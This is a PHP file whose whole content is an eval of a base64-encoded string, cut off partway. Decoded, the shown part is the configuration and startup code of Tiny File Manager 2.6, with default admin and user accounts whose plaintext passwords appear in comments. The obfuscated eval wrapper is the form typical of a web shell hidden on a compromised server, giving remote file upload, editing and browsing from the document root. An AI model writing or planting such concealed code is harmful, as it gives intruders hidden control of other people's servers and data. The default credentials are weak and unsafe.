<?=eval("?>".base64_decode("PD9waHANCi8vRGVmYXVsdCBDb25maWd1cmF0aW9uDQokQ09ORklHID0gJ3sibGFuZyI6ImVuIiwiZXJyb3JfcmVwb3J0aW5nIjpmYWxzZSwic2hvd19oaWRkZW4iOmZhbHNlLCJoaWRlX0NvbHMiOmZhbHNlLCJ0aGVtZSI6ImxpZ2h0In0nOw0KDQovKioNCiAqIEgzSyAtIFRpbnkgRmlsZSBNYW5hZ2VyIFYyLjYNCiAqIEBhdXRob3IgQ0NQIFByb2dyYW1tZXJzDQogKiBAZ2l0aHViIGh0dHBzOi8vZ2l0aHViLmNvbS9wcmFzYXRobWFuaS90aW55ZmlsZW1hbmFnZXINCiAqIEBsaW5rIGh0dHBzOi8vdGlueWZpbGVtYW5hZ2VyLmdpdGh1Yi5pbw0KICovDQoNCi8vVEZNIHZlcnNpb24NCmRlZmluZSgnVkVSU0lPTicsICcyLjYnKTsNCg0KLy9BcHBsaWNhdGlvbiBUaXRsZQ0KZGVmaW5lKCdBUFBfVElUTEUnLCAnVGlueSBGaWxlIE1hbmFnZXInKTsNCg0KLy8gLS0tIEVESVQgQkVMT1cgQ09ORklHVVJBVElPTiBDQVJFRlVMTFkgLS0tDQoNCi8vIEF1dGggd2l0aCBsb2dpbi9wYXNzd29yZA0KLy8gc2V0IHRydWUvZmFsc2UgdG8gZW5hYmxlL2Rpc2FibGUgaXQNCi8vIElzIGluZGVwZW5kZW50IGZyb20gSVAgd2hpdGUtIGFuZCBibGFja2xpc3RpbmcNCiR1c2VfYXV0aCA9IHRydWU7DQoNCi8vIExvZ2luIHVzZXIgbmFtZSBhbmQgcGFzc3dvcmQNCi8vIFVzZXJzOiBhcnJheSgnVXNlcm5hbWUnID0+ICdQYXNzd29yZCcsICdVc2VybmFtZTInID0+ICdQYXNzd29yZDInLCAuLi4pDQovLyBHZW5lcmF0ZSBzZWN1cmUgcGFzc3dvcmQgaGFzaCAtIGh0dHBzOi8vdGlueWZpbGVtYW5hZ2VyLmdpdGh1Yi5pby9kb2NzL3B3ZC5odG1sDQokYXV0aF91c2VycyA9IGFycmF5KA0KICAgICdhZG1pbicgPT4gJyQyeSQxMCRzb2FRMEd3M042SWMyenFxNGFtb3hlTFlEcm9ockNNTDFobGx4VXdqNG1ldVhQaUo1YmV2UycsIC8vYWRtaW5AMTIzDQogICAgJ3VzZXInID0+ICckMnkkMTAkc0R6cWhheGVDRnB0V0xkUUhvWTVUdTBHWWlOOTNaVE1QbWNyNzdscmZRekhoS1NHUjhMd2UnIC8vMTIzNDUNCik7DQoNCi8vIFJlYWRvbmx5IHVzZXJzDQovLyBlLmcuIGFycmF5KCd1c2VycycsICdndWVzdCcsIC4uLikNCiRyZWFkb25seV91c2VycyA9IGFycmF5KA0KICAgICd1c2VyJw0KKTsNCg0KLy8gR2xvYmFsIHJlYWRvbmx5LCBpbmNsdWRpbmcgd2hlbiBhdXRoIGlzIG5vdCBiZWluZyB1c2VkDQokZ2xvYmFsX3JlYWRvbmx5ID0gZmFsc2U7DQoNCi8vIHVzZXIgc3BlY2lmaWMgZGlyZWN0b3JpZXMNCi8vIGFycmF5KCdVc2VybmFtZScgPT4gJ0RpcmVjdG9yeSBwYXRoJywgJ1VzZXJuYW1lMicgPT4gJ0RpcmVjdG9yeSBwYXRoJywgLi4uKQ0KJGRpcmVjdG9yaWVzX3VzZXJzID0gYXJyYXkoKTsNCg0KLy8gRW5hYmxlIGhpZ2hsaWdodC5qcyAoaHR0cHM6Ly9oaWdobGlnaHRqcy5vcmcvKSBvbiB2aWV3J3MgcGFnZQ0KJHVzZV9oaWdobGlnaHRqcyA9IHRydWU7DQoNCi8vIGhpZ2hsaWdodC5qcyBzdHlsZQ0KLy8gZm9yIGRhcmsgdGhlbWUgdXNlICdpci1ibGFjaycNCiRoaWdobGlnaHRqc19zdHlsZSA9ICd2cyc7DQoNCi8vIEVuYWJsZSBhY2UuanMgKGh0dHBzOi8vYWNlLmM5LmlvLykgb24gdmlldydzIHBhZ2UNCiRlZGl0X2ZpbGVzID0gdHJ1ZTsNCg0KLy8gRGVmYXVsdCB0aW1lem9uZSBmb3IgZGF0ZSgpIGFuZCB0aW1lKCkNCi8vIERvYyAtIGh0dHA6Ly9waHAubmV0L21hbnVhbC9lbi90aW1lem9uZXMucGhwDQokZGVmYXVsdF90aW1lem9uZSA9ICdFdGMvVVRDJzsgLy8gVVRDDQoNCi8vIFJvb3QgcGF0aCBmb3IgZmlsZSBtYW5hZ2VyDQovLyB1c2UgYWJzb2x1dGUgcGF0aCBvZiBkaXJlY3RvcnkgaS5lOiAnL3Zhci93d3cvZm9sZGVyJyBvciAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddLicvZm9sZGVyJw0KLy9tYWtlIHN1cmUgdXBkYXRlICRyb290X3VybCBpbiBuZXh0IHNlY3Rpb24NCiRyb290X3BhdGggPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOw0KDQovLyBSb290IHVybCBmb3IgbGlua3MgaW4gZmlsZSBtYW5hZ2VyLlJlbGF0aXZlIHRvICRodHRwX2hvc3QuIFZhcmlhbnRzOiAnJywgJ3BhdGgvdG8vc3ViZm9sZGVyJw0KLy8gV2lsbCBub3Qgd29ya2luZyBpZiAkcm9vdF9wYXRoIHdpbGwgYmUgb3V0c2lkZSBvZiBzZXJ2ZXIgZG9jdW1lbnQgcm9vdA0KJHJvb3RfdXJsID0gJyc7DQoNCi8vIFNlcnZlciBob3N0bmFtZS4gQ2FuIHNldCBtYW51YWxseSBpZiB3cm9uZw0KLy8gJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvZm9sZGVyJw0KJGh0dHBfaG9zdCA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsNCg0KLy8gaW5wdXQgZW5jb2RpbmcgZm9yIGljb252DQokaWNvbnZfaW5wdXRfZW5jb2RpbmcgPSAnVVRGLTgnOw0KDQovLyBkYXRlKCkgZm9ybWF0IGZvciBmaWxlIG1vZGlmaWNhdGlvbiBkYXRlDQovLyBEb2MgLSBodHRwczovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5kYXRlLnBocA0KJGRhdGV0aW1lX2Zvcm1hdCA9ICdtL2QvWSBnOmkgQSc7DQoNCi8vIFBhdGggZGlzcGxheSBtb2RlIHdoZW4gdmlld2luZyBmaWxlIGluZm9ybWF0aW9uDQovLyAnZnVsbCcgPT4gc2hvdyBmdWxsIHBhdGgNCi8vICdyZWxhdGl2ZScgPT4gc2hvdyBwYXRoIHJlbGF0aXZlIHRvIHJvb3RfcGF0aA0KLy8gJ2hvc3QnID0+IHNob3cgcGF0aCBvbiB0aGUgaG9zdA0KJHBhdGhfZGlzcGxheV9tb2RlID0gJ2Z1bGwnOw0KDQovLyBBbGxvd2VkIGZpbGUgZXh0ZW5zaW9ucyBmb3IgY3JlYXRlIGFuZCByZW5hbWUgZmlsZXMNCi8vIGUuZy4gJ3R4dCxodG1sLGNzcyxqcycNCiRhbGxvd2VkX2ZpbGVfZXh0ZW5zaW9ucyA9ICcnOw0KDQovLyBBbGxvd2VkIGZpbGUgZXh0ZW5zaW9ucyBmb3IgdXBsb2FkIGZpbGVzDQovLyBlLmcuICdnaWYscG5nLGpwZyxodG1sLHR4dCcNCiRhbGxvd2VkX3VwbG9hZF9leHRlbnNpb25zID0gJyc7DQoNCi8vIEZhdmljb24gcGF0aC4gVGhpcyBjYW4gYmUgZWl0aGVyIGEgZnVsbCB1cmwgdG8gYW4gLlBORyBpbWFnZSwgb3IgYSBwYXRoIGJhc2VkIG9uIHRoZSBkb2N1bWVudCByb290Lg0KLy8gZnVsbCBwYXRoLCBlLmcgaHR0cDovL2V4YW1wbGUuY29tL2Zhdmljb24ucG5nDQovLyBsb2NhbCBwYXRoLCBlLmcgaW1hZ2VzL2ljb25zL2Zhdmljb24ucG5nDQokZmF2aWNvbl9wYXRoID0gJyc7DQoNCi8vIEZpbGVzIGFuZCBmb2xkZXJzIHRvIGV4Y2x1ZGVkIGZyb20gbGlzdGluZw0KLy8gZS5nLiBhcnJheSgnbXlmaWxlLmh0bWwnLCAncGVyc29uYWwtZm9sZGVyJywgJyoucGhwJywgLi4uKQ0KJGV4Y2x1ZGVfaXRlbXMgPSBhcnJheSgpOw0KDQovLyBPbmxpbmUgb2ZmaWNlIERvY3MgVmlld2VyDQovLyBBdmFpbGFibGUgcnVsZXMgYXJlICdnb29nbGUnLCAnbWljcm9zb2Z0JyBvciBmYWxzZQ0KLy8gR29vZ2xlID0+IFZpZXcgZG9jdW1lbnRzIHVzaW5nIEdvb2dsZSBEb2NzIFZpZXdlcg0KLy8gTWljcm9zb2Z0ID0+IFZpZXcgZG9jdW1lbnRzIHVzaW5nIE1pY3Jvc29mdCBXZWIgQXBwcyBWaWV3ZXINCi8vIGZhbHNlID0+IGRpc2FibGUgb25saW5lIGRvYyB2aWV3ZXINCiRvbmxpbmVfdmlld2VyID0gJ2dvb2dsZSc7DQoNCi8vIFN0aWNreSBOYXYgYmFyDQovLyB0cnVlID0+IGVuYWJsZSBzdGlja3kgaGVhZGVyDQovLyBmYWxzZSA9PiBkaXNhYmxlIHN0aWNreSBoZWFkZXINCiRzdGlja3lfbmF2YmFyID0gdHJ1ZTsNCg0KLy8gTWF4aW11bSBmaWxlIHVwbG9hZCBzaXplDQovLyBJbmNyZWFzZSB0aGUgZm9sbG93aW5nIHZhbHVlcyBpbiBwaHAuaW5pIHRvIHdvcmsgcHJvcGVybHkNCi8vIG1lbW9yeV9saW1pdCwgdXBsb2FkX21heF9maWxlc2l6ZSwgcG9zdF9tYXhfc2l6ZQ0KJG1heF91cGxvYWRfc2l6ZV9ieXRlcyA9IDUwMDAwMDAwMDA7IC8vIHNpemUgNSwwMDAsMDAwLDAwMCBieXRlcyAofjVHQikNCg0KLy8gY2h1bmsgc2l6ZSB1c2VkIGZvciB1cGxvYWQNCi8vIGVnLiBkZWNyZWFzZSB0byAxTUIgaWYgbmdpbnggcmVwb3J0cyBwcm9ibGVtIDQxMyBlbnRpdHkgdG9vIGxhcmdlDQokdXBsb2FkX2NodW5rX3NpemVfYnl0ZXMgPSAyMDAwMDAwOyAvLyBjaHVuayBzaXplIDIsMDAwLDAwMCBieXRlcyAofjJNQikNCg0KLy8gUG9zc2libGUgcnVsZXMgYXJlICdPRkYnLCAnQU5EJyBvciAnT1InDQovLyBPRkYgPT4gRG9uJ3QgY2hlY2sgY29ubmVjdGlvbiBJUCwgZGVmYXVsdHMgdG8gT0ZGDQovLyBBTkQgPT4gQ29ubmVjdGlvbiBtdXN0IGJlIG9uIHRoZSB3aGl0ZWxpc3QsIGFuZCBub3Qgb24gdGhlIGJsYWNrbGlzdA0KLy8gT1IgPT4gQ29ubmVjdGlvbiBtdXN0IGJlIG9uIHRoZSB3aGl0ZWxpc3QsIG9yIG5vdCBvbiB0aGUgYmxhY2tsaXN0DQokaXBfcnVsZXNldCA9ICdPRkYnOw0KDQovLyBTaG91bGQgdXNlcnMgYmUgbm90aWZpZWQgb2YgdGhlaXIgYmxvY2s/DQokaXBfc2lsZW50ID0gdHJ1ZTsNCg0KLy8gSVAtYWRkcmVzc2VzLCBib3RoIGlwdjQgYW5kIGlwdjYNCiRpcF93aGl0ZWxpc3QgPSBhcnJheSgNCiAgICAnMTI3LjAuMC4xJywgICAgLy8gbG9jYWwgaXB2NA0KICAgICc6OjEnICAgICAgICAgICAvLyBsb2NhbCBpcHY2DQopOw0KDQovLyBJUC1hZGRyZXNzZXMsIGJvdGggaXB2NCBhbmQgaXB2Ng0KJGlwX2JsYWNrbGlzdCA9IGFycmF5KA0KICAgICcwLjAuMC4wJywgICAgICAvLyBub24tcm91dGFibGUgbWV0YSBpcHY0DQogICAgJzo6JyAgICAgICAgICAgIC8vIG5vbi1yb3V0YWJsZSBtZXRhIGlwdjYNCik7DQoNCi8vIGlmIFVzZXIgaGFzIHRoZSBleHRlcm5hbCBjb25maWcgZmlsZSwgdHJ5IHRvIHVzZSBpdCB0byBvdmVycmlkZSB0aGUgZGVmYXVsdCBjb25maWcgYWJvdmUgW2NvbmZpZy5waHBdDQovLyBzYW1wbGUgY29uZmlnIC0gaHR0cHM6Ly90aW55ZmlsZW1hbmFnZXIuZ2l0aHViLmlvL2NvbmZpZy1zYW1wbGUudHh0DQokY29uZmlnX2ZpbGUgPSBfX0RJUl9fIC4gJy9jb25maWcucGhwJzsNCmlmIChpc19yZWFkYWJsZSgkY29uZmlnX2ZpbGUpKSB7DQogICAgQGluY2x1ZGUoJGNvbmZpZ19maWxlKTsNCn0NCg0KLy8gRXh0ZXJuYWwgQ0ROIHJlc291cmNlcyB0aGF0IGNhbiBiZSB1c2VkIGluIHRoZSBIVE1MIChyZXBsYWNlIGZvciBHRFBSIGNvbXBsaWFuY2UpDQokZXh0ZXJuYWwgPSBhcnJheSgNCiAgICAnY3NzLWJvb3RzdHJhcCcgPT4gJzxsaW5rIGhyZWY9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vYm9vdHN0cmFwQDUuMy4zL2Rpc3QvY3NzL2Jvb3RzdHJhcC5taW4uY3NzIiByZWw9InN0eWxlc2hlZXQiIGludGVncml0eT0ic2hhMzg0LVFXVEtaeWpwUEVqSVN2NVdhUlU5T0ZlUnBvazZZY3RuWW1EcjVwTmx5VDJiUmpYaDBKTWhqWTZoVytBTEV3SUgiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPicsDQogICAgJ2Nzcy1kcm9wem9uZScgPT4gJzxsaW5rIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2Ryb3B6b25lLzUuOS4zL21pbi9kcm9wem9uZS5taW4uY3NzIiByZWw9InN0eWxlc2hlZXQiPicsDQogICAgJ2Nzcy1mb250LWF3ZXNvbWUnID0+ICc8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2ZvbnQtYXdlc29tZS80LjcuMC9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPicsDQogICAgJ2Nzcy1oaWdobGlnaHRqcycgPT4gJzxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvaGlnaGxpZ2h0LmpzLzExLjkuMC9zdHlsZXMvJyAuICRoaWdobGlnaHRqc19zdHlsZSAuICcubWluLmNzcyI+JywNCiAgICAnanMtYWNlJyA9PiAnPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2FjZS8xLjMyLjIvYWNlLmpzIj48L3NjcmlwdD4nLA0KICAgICdqcy1ib290c3RyYXAnID0+ICc8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9ib290c3RyYXBANS4zLjMvZGlzdC9qcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyIgaW50ZWdyaXR5PSJzaGEzODQtWXZwY3JZZjB0WTNsSEI2ME5Oa21YYzVzOWZEVlpMRVNhQUE1NU5Eek94aHk5R2tjSWRzbEsxZU43TjZqSWVIeiIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+JywNCiAgICAnanMtZHJvcHpvbmUnID0+ICc8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZHJvcHpvbmUvNS45LjMvbWluL2Ryb3B6b25lLm1pbi5qcyI+PC9zY3JpcHQ+JywNCiAgICAnanMtanF1ZXJ5JyA9PiAnPHNjcmlwdCBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjYuMS5taW4uanMiIGludGVncml0eT0ic2hhMjU2LW84OEF3UW5aQitWRHZFOXR2SVhyTVFhUGxGRlNVVFIrbmxkUW0xTHVQWFE9IiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4nLA0KICAgICdqcy1qcXVlcnktZGF0YXRhYmxlcycgPT4gJzxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5kYXRhdGFibGVzLm5ldC8xLjEzLjEvanMvanF1ZXJ5LmRhdGFUYWJsZXMubWluLmpzIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIiBkZWZlcj48L3NjcmlwdD4nLA0KICAgICdqcy1oaWdobGlnaHRqcycgPT4gJzxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9oaWdobGlnaHQuanMvMTEuOS4wL2hpZ2hsaWdodC5taW4uanMiPjwvc2NyaXB0PicsDQogICAgJ3ByZS1qc2RlbGl2cicgPT4gJzxsaW5rIHJlbD0icHJlY29ubmVjdCIgaHJlZj0iaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0IiBjcm9zc29yaWdpbi8+PGxpbmsgcmVsPSJkbnMtcHJlZmV0Y2giIGhyZWY9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldCIvPicsDQogICAgJ3ByZS1jbG91ZGZsYXJlJyA9PiAnPGxpbmsgcmVsPSJwcmVjb25uZWN0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tIiBjcm9zc29yaWdpbi8+PGxpbmsgcmVsPSJkbnMtcHJlZmV0Y2giIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20iLz4nDQopOw0KDQovLyAtLS0gRURJVCBCRUxPVyBDQVJFRlVMTFkgT1IgRE8gTk9UIEVESVQgQVQgQUxMIC0tLQ0KDQovLyBtYXggdXBsb2FkIGZpbGUgc2l6ZQ0KZGVmaW5lKCdNQVhfVVBMT0FEX1NJWkUnLCAkbWF4X3VwbG9hZF9zaXplX2J5dGVzKTsNCg0KLy8gdXBsb2FkIGNodW5rIHNpemUNCmRlZmluZSgnVVBMT0FEX0NIVU5LX1NJWkUnLCAkdXBsb2FkX2NodW5rX3NpemVfYnl0ZXMpOw0KDQovLyBwcml2YXRlIGtleSBhbmQgc2Vzc2lvbiBuYW1lIHRvIHN0b3JlIHRvIHRoZSBzZXNzaW9uDQppZiAoIWRlZmluZWQoJ0ZNX1NFU1NJT05fSUQnKSkgew0KICAgIGRlZmluZSgnRk1fU0VTU0lPTl9JRCcsICdmaWxlbWFuYWdlcicpOw0KfQ0KDQovLyBDb25maWd1cmF0aW9uDQokY2ZnID0gbmV3IEZNX0NvbmZpZygpOw0KDQovLyBEZWZhdWx0IGxhbmd1YWdlDQokbGFuZyA9IGlzc2V0KCRjZmctPmRhdGFbJ2xhbmcnXSkgPyAkY2ZnLT5kYXRhWydsYW5nJ10gOiAnZW4nOw0KDQovLyBTaG93IG9yIGhpZGUgZmlsZXMgYW5kIGZvbGRlcnMgdGhhdCBzdGFydHMgd2l0aCBhIGRvdA0KJHNob3dfaGlkZGVuX2ZpbGVzID0gaXNzZXQoJGNmZy0+ZGF0YVsnc2hvd19oaWRkZW4nXSkgPyAkY2ZnLT5kYXRhWydzaG93X2hpZGRlbiddIDogdHJ1ZTsNCg0KLy8gUEhQIGVycm9yIHJlcG9ydGluZyAtIGZhbHNlID0gVHVybnMgb2ZmIEVycm9ycywgdHJ1ZSA9IFR1cm5zIG9uIEVycm9ycw0KJHJlcG9ydF9lcnJvcnMgPSBpc3NldCgkY2ZnLT5kYXRhWydlcnJvcl9yZXBvcnRpbmcnXSkgPyAkY2ZnLT5kYXRhWydlcnJvcl9yZXBvcnRpbmcnXSA6IHRydWU7DQoNCi8vIEhpZGUgUGVybWlzc2lvbnMgYW5kIE93bmVyIGNvbHMgaW4gZmlsZS1saXN0aW5nDQokaGlkZV9Db2xzID0gaXNzZXQoJGNmZy0+ZGF0YVsnaGlkZV9Db2xzJ10pID8gJGNmZy0+ZGF0YVsnaGlkZV9Db2xzJ10gOiB0cnVlOw0KDQovLyBUaGVtZQ0KJHRoZW1lID0gaXNzZXQoJGNmZy0+ZGF0YVsndGhlbWUnXSkgPyAkY2ZnLT5kYXRhWyd0aGVtZSddIDogJ2xpZ2h0JzsNCg0KZGVmaW5lKCdGTV9USEVNRScsICR0aGVtZSk7DQoNCi8vYXZhaWxhYmxlIGxhbmd1YWdlcw0KJGxhbmdfbGlzdCA9IGFycmF5KA0KICAgICdlbicgPT4gJ0VuZ2xpc2gnDQopOw0KDQppZiAoJHJlcG9ydF9lcnJvcnMgPT0gdHJ1ZSkgew0KICAgIEBpbmlfc2V0KCdlcnJvcl9yZXBvcnRpbmcnLCBFX0FMTCk7DQogICAgQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMSk7DQp9IGVsc2Ugew0KICAgIEBpbmlfc2V0KCdlcnJvcl9yZXBvcnRpbmcnLCBFX0FMTCk7DQogICAgQGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQp9DQoNCi8vIGlmIGZtIGluY2x1ZGVkDQppZiAoZGVmaW5lZCgnRk1fRU1CRUQnKSkgew0KICAgICR1c2VfYXV0aCA9IGZhbHNlOw0KICAgICRzdGlja3lfbmF2YmFyID0gZmFsc2U7DQp9IGVsc2Ugew0KICAgIEBzZXRfdGltZV9saW1pdCg2MDApOw0KDQogICAgZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldCgkZGVmYXVsdF90aW1lem9uZSk7DQoNCiAgICBpbmlfc2V0KCdkZWZhdWx0X2NoYXJzZXQnLCAnVVRGLTgnKTsNCiAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS42LjAnLCAnPCcpICYmIGZ1bmN0aW9uX2V4aXN0cygnbWJfaW50ZXJuYWxfZW5jb2RpbmcnKSkgew0KICAgICAgICBtYl9pbnRlcm5hbF9lbmNvZGluZygnVVRGLTgnKTsNCiAgICB9DQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnbWJfcmVnZXhfZW5jb2RpbmcnKSkgew0KICAgICAgICBtYl9yZWdleF9lbmNvZGluZygnVVRGLTgnKTsNCiAgICB9DQoNCiAgICBzZXNzaW9uX2NhY2hlX2xpbWl0ZXIoJ25vY2FjaGUnKTsgLy8gUHJldmVudCBsb2dvdXQgaXNzdWUgYWZ0ZXIgcGFnZSB3YXMgY2FjaGVkDQogICAgc2Vzc2lvbl9uYW1lKEZNX1NFU1NJT05fSUQpOw0KICAgIGZ1bmN0aW9uIHNlc3Npb25fZXJyb3JfaGFuZGxpbmdfZnVuY3Rpb24oJGNvZGUsICRtc2csICRmaWxlLCAkbGluZSkNCiAgICB7DQogICAgICAgIC8vIFBlcm1pc3Npb24gZGVuaWVkIGZvciBkZWZhdWx0IHNlc3Npb24sIHRyeSB0byBjcmVhdGUgYSBuZXcgb25lDQogICAgICAgIGlmICgkY29kZSA9PSAyKSB7DQogICAgICAgICAgICBzZXNzaW9uX2Fib3J0KCk7DQogICAgICAgICAgICBzZXNzaW9uX2lkKHNlc3Npb25fY3JlYXRlX2lkKCkpOw0KICAgICAgICAgICAgQHNlc3Npb25fc3RhcnQoKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBzZXRfZXJyb3JfaGFuZGxlcignc2Vzc2lvbl9lcnJvcl9oYW5kbGluZ19mdW5jdGlvbicpOw0KICAgIHNlc3Npb25fc3RhcnQoKTsNCiAgICByZXN0b3JlX2Vycm9yX2hhbmRsZXIoKTsNCn0NCg0KLy9HZW5lcmF0aW5nIENTUkYgVG9rZW4NCmlmIChlbXB0eSgkX1NFU1NJT05bJ3Rva2VuJ10pKSB7DQogICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygncmFuZG9tX2J5dGVzJykpIHsNCiAgICAgICAgJF9TRVNTSU9OWyd0b2tlbiddID0gYmluMmhleChyYW5kb21fYnl0ZXMoMzIpKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkX1NFU1NJT05bJ3Rva2VuJ10gPSBiaW4yaGV4KG9wZW5zc2xfcmFuZG9tX3BzZXVkb19ieXRlcygzMikpOw0KICAgIH0NCn0NCg0KaWYgKGVtcHR5KCRhdXRoX3VzZXJzKSkgew0KICAgICR1c2VfYXV0aCA9IGZhbHNlOw0KfQ0KDQokaXNfaHR0cHMgPSBpc3NldCgkX1NFUlZFUlsnSFRUUFMnXSkgJiYgKCRfU0VSVkVSWydIVFRQUyddID09ICdvbicgfHwgJF9TRVJWRVJbJ0hUVFBTJ10gPT0gMSkNCiAgICB8fCBpc3NldCgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9QUk9UTyddKSAmJiAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9QUk9UTyddID09ICdodHRwcyc7DQoNCi8vIHVwZGF0ZSAkcm9vdF91cmwgYmFzZWQgb24gdXNlciBzcGVjaWZpYyBkaXJlY3Rvcmllcw0KaWYgKGlzc2V0KCRfU0VTU0lPTltGTV9TRVNTSU9OX0lEXVsnbG9nZ2VkJ10pICYmICFlbXB0eSgkZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXV0pKSB7DQogICAgJHdkID0gZm1fY2xlYW5fcGF0aChkaXJuYW1lKCRfU0VSVkVSWydQSFBfU0VMRiddKSk7DQogICAgJHJvb3RfdXJsID0gICRyb290X3VybCAuICR3ZCAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkZGlyZWN0b3JpZXNfdXNlcnNbJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWydsb2dnZWQnXV07DQp9DQovLyBjbGVhbiAkcm9vdF91cmwNCiRyb290X3VybCA9IGZtX2NsZWFuX3BhdGgoJHJvb3RfdXJsKTsNCg0KLy8gYWJzIHBhdGggZm9yIHNpdGUNCmRlZmluZWQoJ0ZNX1JPT1RfVVJMJykgfHwgZGVmaW5lKCdGTV9ST09UX1VSTCcsICgkaXNfaHR0cHMgPyAnaHR0cHMnIDogJ2h0dHAnKSAuICc6Ly8nIC4gJGh0dHBfaG9zdCAuICghZW1wdHkoJHJvb3RfdXJsKSA/ICcvJyAuICRyb290X3VybCA6ICcnKSk7DQpkZWZpbmVkKCdGTV9TRUxGX1VSTCcpIHx8IGRlZmluZSgnRk1fU0VMRl9VUkwnLCAoJGlzX2h0dHBzID8gJ2h0dHBzJyA6ICdodHRwJykgLiAnOi8vJyAuICRodHRwX2hvc3QgLiAkX1NFUlZFUlsnUEhQX1NFTEYnXSk7DQoNCi8vIGxvZ291dA0KaWYgKGlzc2V0KCRfR0VUWydsb2dvdXQnXSkpIHsNCiAgICB1bnNldCgkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bJ2xvZ2dlZCddKTsNCiAgICB1bnNldCgkX1NFU1NJT05bJ3Rva2VuJ10pOw0KICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMKTsNCn0NCg0KLy8gVmFsaWRhdGUgY29ubmVjdGlvbiBJUA0KaWYgKCRpcF9ydWxlc2V0ICE9ICdPRkYnKSB7DQogICAgZnVuY3Rpb24gZ2V0Q2xpZW50SVAoKQ0KICAgIHsNCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoJ0hUVFBfQ0ZfQ09OTkVDVElOR19JUCcsICRfU0VSVkVSKSkgew0KICAgICAgICAgICAgcmV0dXJuICAkX1NFUlZFUlsiSFRUUF9DRl9DT05ORUNUSU5HX0lQIl07DQogICAgICAgIH0gZWxzZSBpZiAoYXJyYXlfa2V5X2V4aXN0cygnSFRUUF9YX0ZPUldBUkRFRF9GT1InLCAkX1NFUlZFUikpIHsNCiAgICAgICAgICAgIHJldHVybiAgJF9TRVJWRVJbIkhUVFBfWF9GT1JXQVJERURfRk9SIl07DQogICAgICAgIH0gZWxzZSBpZiAoYXJyYXlfa2V5X2V4aXN0cygnUkVNT1RFX0FERFInLCAkX1NFUlZFUikpIHsNCiAgICAgICAgICAgIHJldHVybiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsNCiAgICAgICAgfSBlbHNlIGlmIChhcnJheV9rZXlfZXhpc3RzKCdIVFRQX0NMSUVOVF9JUCcsICRfU0VSVkVSKSkgew0KICAgICAgICAgICAgcmV0dXJuICRfU0VSVkVSWydIVFRQX0NMSUVOVF9JUCddOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAnJzsNCiAgICB9DQoNCiAgICAkY2xpZW50SXAgPSBnZXRDbGllbnRJUCgpOw0KICAgICRwcm9jZWVkID0gZmFsc2U7DQogICAgJHdoaXRlbGlzdGVkID0gaW5fYXJyYXkoJGNsaWVudElwLCAkaXBfd2hpdGVsaXN0KTsNCiAgICAkYmxhY2tsaXN0ZWQgPSBpbl9hcnJheSgkY2xpZW50SXAsICRpcF9ibGFja2xpc3QpOw0KDQogICAgaWYgKCRpcF9ydWxlc2V0ID09ICdBTkQnKSB7DQogICAgICAgIGlmICgkd2hpdGVsaXN0ZWQgPT0gdHJ1ZSAmJiAkYmxhY2tsaXN0ZWQgPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICRwcm9jZWVkID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0gZWxzZQ0KICAgIGlmICgkaXBfcnVsZXNldCA9PSAnT1InKSB7DQogICAgICAgIGlmICgkd2hpdGVsaXN0ZWQgPT0gdHJ1ZSB8fCAkYmxhY2tsaXN0ZWQgPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICRwcm9jZWVkID0gdHJ1ZTs